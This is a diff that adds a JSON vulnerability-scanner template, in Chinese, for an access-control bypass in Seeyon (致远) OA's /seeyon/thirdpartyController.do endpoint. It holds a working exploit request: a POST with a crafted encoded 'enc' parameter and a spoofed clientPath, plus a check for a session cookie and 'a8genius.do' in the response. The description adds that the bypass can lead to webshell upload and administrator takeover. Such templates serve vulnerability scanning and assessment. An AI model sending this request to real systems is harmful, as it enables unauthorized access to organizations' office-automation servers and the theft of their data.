@@ -1,0 +1,37 @@
+{
+  "product": "致远OA",
+  "vul_name": "致远OA thirdpartyController.do 权限绕过",
+  "type": "访问控制",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "致远OA系统在web页面 /seeyon/thirdpartyController.do 系统默认enc参数值过滤不足，攻击者通过构造恶意请求，获取用户访问权限，如果系统存在portalDesignerManager类，攻击者可以进一步利用漏洞写入脚本木马，从而获得管理员权限，在网页上加挂木马和各种恶意程序，盗取敏感信息等。",
+  "version": "",
+  "note": "",
+  "search": {},
+  "protocol": "http",
+  "link": "https://blog.51cto.com/u_15127579/2778196",
+  "fix": [
+    "升级系统。"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/seeyon/thirdpartyController.do",
+      "data": "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "a8genius.do",
+          "header": {
+            "Set-Cookie": ""
+          }
+        }
+      ]
+    }
+  }
+}
